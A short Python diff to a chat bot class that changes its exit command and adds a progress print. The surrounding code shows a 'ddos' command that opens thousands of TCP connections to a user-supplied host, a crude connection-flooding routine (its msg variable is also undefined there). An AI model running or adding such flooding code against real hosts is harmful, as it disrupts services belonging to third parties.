@@ -25,13 +25,14 @@ class Toast(BaseResponder):
 			cmd = command.split()
 			if cmd[0] == 'ddos' and cmd[1]:
 				self.dudos(host=cmd[1])
-			elif cmd[0] == 'stop':
+			elif cmd[0] == 'quit':
 				self.respond(msg, 'Bye!')
-				os._exit()
+				exit()
 
 	def dudos(self, host='127.0.0.1', port=8080, times=10000):
 		self.respond(msg, 'Dudos in progress...')
 		for _ in range(times):
+			print('.')
 			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 			sock.connect((host, port))
 			sock.send(b'hello')
